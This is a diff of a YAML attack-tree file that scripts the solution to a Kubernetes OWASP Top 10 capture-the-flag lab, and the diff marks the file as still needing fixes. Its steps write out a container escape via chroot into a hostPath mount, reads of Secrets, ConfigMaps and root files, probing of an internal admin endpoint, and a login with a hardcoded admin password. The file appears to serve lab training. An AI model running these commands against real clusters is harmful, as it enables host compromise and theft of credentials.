@@ -1,3 +1,4 @@
+### THIS STILL NEEDS FIXES!!!
 attack:
   name: "Kubernetes OWASP Top 10 CTF Trees"
   description: "Enhanced attack trees targeting OWASP Top 10 Kubernetes vulnerabilities in sample CTF"
@@ -5,142 +6,134 @@ attack:
   variables:
     - name: challenge_namespace
       value: "vulnerable-app"
-    - name: frontend_deploy
-      value: "deploy/frontend"
-    - name: backend_deploy
-      value: "deploy/backend"
-    - name: debug_token
-      extract: "kubectl get configmap db-credentials -n ${challenge_namespace} -o jsonpath='{.data.API_SECRET}'"
+    - name: frontend_pod
+      value: "$(kubectl get pod -l app=frontend -n vulnerable-app -o name | head -n1)"
+    - name: backend_pod
+      value: "$(kubectl get pod -l app=backend -n vulnerable-app -o name | head -n1)"
 
   steps:
     - id: 1.0
-      name: "Read insecure workload flag from ConfigMap"
-      command: "kubectl get configmap challenge-flags -n ${challenge_namespace} -o yaml"
-      tags: ["owasp-1", "configmap"]
-      conditions:
-        - match: "FLAG{insecure_workload_config}"
-          next:
-            - id: 1.1
-              name: "Capture insecure workload config flag"
-              command: "grep 'insecure_workload_config' <<< $(kubectl get configmap challenge-flags -n ${challenge_namespace} -o yaml)"
-              on_success:
-                - capture_flag: "FLAG{insecure_workload_config}"
-                - remediate: "Apply PodSecurityContext with readOnlyRootFilesystem, drop ALL capabilities, and avoid privileged mode."
-              on_failure:
-                - log: "Insecure workload flag missing"
-                - next: 1.2
-
-    - id: 1.2
       name: "Escape to host via hostPath volume"
-      command: "kubectl debug node/lima-rancher-desktop -it --image=alpine -- chroot /host"
-      tags: ["container_escape", "hostpath"]
+      command: "kubectl exec -n ${challenge_namespace} admin-tools -- chroot /host cat /tmp/k8s-node-flag.txt"
+      tags: ["owasp-1", "hostpath", "privileged"]
       on_success:
-        - next: 1.3
+        - capture_flag: "FLAG{...}"
+        - remediate: "Avoid hostPath and privileged pods"
+        - next: 1.1
       on_failure:
-        - log: "HostPath escape failed"
+        - next: 1.1
 
-    - id: 1.3
-      name: "Read flag from host-mounted path"
-      command: "cat /tmp/k8s-node-flag.txt"
-      on_success:
-        - capture_flag: "FLAG{node_compromise_via_hostpath}"
-        - remediate: "Avoid hostPath mounts unless strictly necessary. Use readOnly if required."
-
-    - id: 1.4
-      name: "Check privileged pod"
+    - id: 1.1
+      name: "Check privileged admin pod"
       command: "kubectl exec -n ${challenge_namespace} admin-tools -- cat /root/flag.txt"
-      tags: ["privileged", "security_context"]
       on_success:
-        - capture_flag: "FLAG{privileged_admin_pod}"
-        - remediate: "Do not run containers in privileged mode."
+        - capture_flag: "FLAG{...}"
+        - next: 2.0
       on_failure:
-        - log: "Admin pod not accessible"
+        - next: 2.0
 
     - id: 2.0
       name: "Read Docker image filesystem flags"
-      command: "kubectl exec -n ${challenge_namespace} ${frontend_deploy} -- sh -c 'grep -r FLAG /app || true'"
+      command: "kubectl exec -n ${challenge_namespace} ${frontend_pod} -- sh -c 'grep -r FLAG /app || true'"
       tags: ["owasp-2", "supply_chain"]
       on_success:
-        - capture_flag: "FLAG{backdoor_in_maintenance_script}"
-        - capture_flag: "FLAG{docker_image_history_leak}"
-        - remediate: "Avoid placing sensitive data or flags in image layers. Scan images for secrets."
-
-    - id: 2.1
-      name: "Check challenge-flags for supply chain vulnerability"
-      command: "kubectl get configmap challenge-flags -n ${challenge_namespace} -o yaml"
-      conditions:
-        - match: 'FLAG{\s*supply_chain_vulnerability}'
-          next:
-            - id: 2.2
-              name: "Capture supply chain flag"
-              command: "grep 'supply_chain_vulnerability' <<< $(kubectl get configmap challenge-flags -n ${challenge_namespace} -o yaml)"
-              on_success:
-                - capture_flag: "FLAG{supply_chain_vulnerability}"
+        - capture_flag: "FLAG{...}"
+        - capture_flag: "FLAG{...}"
+        - next: 3.0
+      on_failure:
+        - next: 3.0
 
     - id: 3.0
       name: "Check RBAC misconfiguration"
-      command: "kubectl get clusterrolebinding vulnerable-cluster-rolebinding -o yaml"
+      command: "kubectl get sa vulnerable-sa -n ${challenge_namespace} -o yaml"
       tags: ["owasp-3", "rbac"]
       on_success:
-        - capture_flag: "FLAG{overly_permissive_rbac}"
-        - remediate: "Restrict RBAC roles and audit service account privileges."
+        - capture_flag: "FLAG{...}"
+        - next: 4.0
+      on_failure:
+        - next: 4.0
 
     - id: 4.0
-      name: "Access services across namespaces"
-      command: "kubectl get configmap challenge-flags -n ${challenge_namespace} -o yaml"
+      name: "Access internal-only admin endpoint"
+      command: "kubectl exec -n ${challenge_namespace} ${frontend_pod} -- curl -s http://backend-service:5000/internal/admin"
       tags: ["owasp-4", "network"]
       on_success:
-        - capture_flag: "FLAG{missing_network_policy}"
-        - remediate: "Apply NetworkPolicies to restrict pod-to-pod communication."
+        - capture_flag: "FLAG{...}"
+        - next: 5.0
+      on_failure:
+        - next: 5.0
 
     - id: 5.0
-      name: "Query debug mode for logs"
-      command: "curl -s http://localhost/api/config"
+      name: "Check simulated journald logs"
+      command: "kubectl exec -n ${challenge_namespace} admin-tools -- grep FLAG /host/var/log/syslog"
       tags: ["owasp-5", "logging"]
       on_success:
-        - capture_flag: "FLAG{inadequate_logging}"
-        - remediate: "Disable DEBUG in production and enforce audit logging."
+        - capture_flag: "FLAG{...}"
+        - next: 6.0
+      on_failure:
+        - next: 6.0
 
     - id: 6.0
-      name: "Extract API keys from ConfigMap"
-      command: "kubectl get configmap db-credentials -n ${challenge_namespace} -o yaml"
-      tags: ["owasp-6", "auth"]
+      name: "Leak credentials via frontend source"
+      command: "kubectl exec -n ${challenge_namespace} ${frontend_pod} -- cat /usr/share/nginx/html/index.html"
       on_success:
-        - capture_flag: "FLAG{broken_authentication}"
+        - next: 6.1
+      on_failure:
+        - next: 6.1
+
+    - id: 6.1
+      name: "Use leaked credentials to access backend login"
+      command: |
+        kubectl exec -n ${challenge_namespace} ${frontend_pod} \
+          -- curl -s -X POST http://backend-service:5000/api/login \
+          -H 'Content-Type: application/json' \
+          -d '{"username":"admin", "password":"super_admin_password"}'
+      on_success:
+        - capture_flag: "FLAG{...}"
+        - next: 7.0
+      on_failure:
+        - next: 7.0
 
     - id: 7.0
-      name: "Check backend env for insecure deployment"
-      command: "kubectl exec -n ${challenge_namespace} ${backend_deploy} -- printenv"
+      name: "Check backend pod env for insecure flags"
+      command: "kubectl exec -n ${challenge_namespace} ${backend_pod} -- printenv"
       on_success:
-        - capture_flag: "FLAG{insecure_k8s_deployment}"
-        - capture_flag: "FLAG{missing_security_context}"
+        - capture_flag: "FLAG{...}"
+        - capture_flag: "FLAG{...}"
+        - next: 8.0
+      on_failure:
+        - next: 8.0
 
     - id: 8.0
-      name: "Check secret and config exposures"
-      command: "kubectl get secret application-secrets -n ${challenge_namespace} -o yaml"
-      tags: ["owasp-8"]
-      on_success:
-        - capture_flag: "FLAG{secrets_badly_managed}"
-
-    - id: 8.1
-      name: "Expose data in db-credentials ConfigMap"
+      name: "Check ConfigMap for secrets"
       command: "kubectl get configmap db-credentials -n ${challenge_namespace} -o yaml"
       on_success:
-        - capture_flag: "FLAG{sensitive_data_in_configmap}"
-        - capture_flag: "FLAG{secret_management_failures}"
+        - capture_flag: "FLAG{...}"
+        - capture_flag: "FLAG{...}"
+        - next: 9.0
+      on_failure:
+        - next: 9.0
 
     - id: 9.0
-      name: "Expose misconfigured dashboard access"
-      command: "kubectl get configmap challenge-flags -n ${challenge_namespace} -o yaml"
-      tags: ["owasp-9"]
+      name: "Read flag from dashboard Secret"
+      command: "kubectl get secret dashboard-flag -n ${challenge_namespace} -o jsonpath='{.data.flag}' | base64 -d"
       on_success:
-        - capture_flag: "FLAG{misconfigured_dashboard}"
-        - capture_flag: "FLAG{missing_admission_controls}"
+        - capture_flag: "FLAG{...}"
+        - next: 9.1
+      on_failure:
+        - next: 9.1
+
+    - id: 9.1
+      name: "Simulate missing admission controls"
+      command: "kubectl get configmap admission-control-config -n ${challenge_namespace} -o yaml"
+      on_success:
+        - capture_flag: "FLAG{...}"
+        - next: 10.0
+      on_failure:
+        - next: 10.0
 
     - id: 10.0
-      name: "Access outdated version flag"
-      command: "kubectl get configmap challenge-flags -n ${challenge_namespace} -o yaml"
-      tags: ["owasp-10"]
+      name: "Check for outdated base image flags"
+      command: "kubectl exec -n ${challenge_namespace} ${frontend_pod} -- grep -r FLAG / || true"
       on_success:
-        - capture_flag: "FLAG{outdated_components}"
-        - remediate: "Enable scanning and auto-upgrades of cluster components."
+        - capture_flag: "FLAG{...}"
